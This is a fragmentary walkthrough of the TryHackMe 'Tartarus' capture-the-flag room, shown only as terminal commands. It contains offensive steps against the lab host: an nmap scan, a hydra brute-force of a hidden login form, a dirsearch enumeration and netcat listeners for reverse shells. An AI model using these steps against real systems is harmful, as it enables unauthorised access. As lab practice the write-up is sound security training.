...
```
bibo318@parrot:~/CTFs/tryhackme/Tartarus$ sudo nmap -A -sS -sC -sV -O 10.10.205.15
...
```
bibo318@parrot:~/CTFs/tryhackme/Tartarus$ ftp 10.10.205.15
...
```
bibo318@parrot:~/CTFs/tryhackme/Tartarus$ cat yougotgoodeyes.txt
/sUp3r-s3cr3t
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Tartarus$ hydra -L userid -P credentials.txt 10.10.205.15 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect"
...
```
bibo318@parrot:~/CTFs/tryhackme/Tartarus$ sudo /opt/dirsearch/dirsearch.py -u http://10.10.205.15/sUp3r-s3cr3t/ -E -w /usr/share/wordlists/dirb/common.txt
[sudo] password for kali:
...
```
bibo318@parrot:~/CTFs/tryhackme/Tartarus$ nc -nlvp 9001
...
```
bibo318@parrot:~/CTFs/tryhackme/Tartarus$ nc -nlvp 9002
